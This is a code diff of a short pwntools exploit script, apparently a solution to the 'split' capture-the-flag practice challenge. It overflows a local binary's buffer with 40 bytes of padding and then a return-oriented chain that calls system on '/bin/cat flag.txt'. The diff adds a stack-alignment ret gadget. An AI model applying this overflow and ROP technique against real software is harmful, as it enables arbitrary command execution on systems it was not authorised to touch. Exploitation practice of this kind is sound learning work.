@@ -13,14 +13,11 @@ from pwn import *
 
 p = process("./split")
 
-g_rdi = 0x4007c3 # pop rdi; ret;
-g_system = 0x400560 # system function
-g_string = 0x601060 # /bin/cat flag.txt
-
 payload = b"a" * (40)
-payload += p64(g_rdi)
-payload += p64(g_string)
-payload += p64(g_system)
+payload += p64(0x4007c3) # pop rdi; ret;
+payload += p64(0x601060) # str /bin/cat flag.txt
+payload += p64(0x40053e) # ret
+payload += p64(0x400560) # system function
 
 p.sendline(payload)
 p.interactive()
